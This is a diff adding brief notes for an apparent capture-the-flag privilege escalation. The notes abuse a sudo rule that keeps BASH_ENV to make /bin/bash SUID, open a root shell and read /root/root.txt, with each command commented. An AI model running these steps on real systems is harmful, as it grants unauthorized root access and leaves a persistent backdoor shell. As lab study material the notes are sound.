@@ -1,0 +1,11 @@
+Matching Defaults entries for hish on environment:
+   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+="ENV
+BASH_ENV", use_pty 
+
+echo -e '#!/bin/bash\nchmod +s /bin/bash' > root.sh         ##Creates a script root.sh that gives /bin/bash the SUID bit — meaning any user running it gets root privileges (chmod +s).
+chmod 777 root.sh
+sudo BASH_ENV=root.sh /usr/bin/systeminfo         ##BASH_ENV is an environment variable that tells Bash to load a specific script before executing anything.
+/bin/bash -p                                      ##Since systeminfo is a bash script, and sudo allows BASH_ENV to persist (as seen in env_keep), the script root.sh will be sourced as root before systeminfo runs.
+cat /root/root.txt                                ## The -p flag tells Bash to not drop privileges — so because /bin/bash now has the SUID bit set, and you're running it, you become root.
+
+
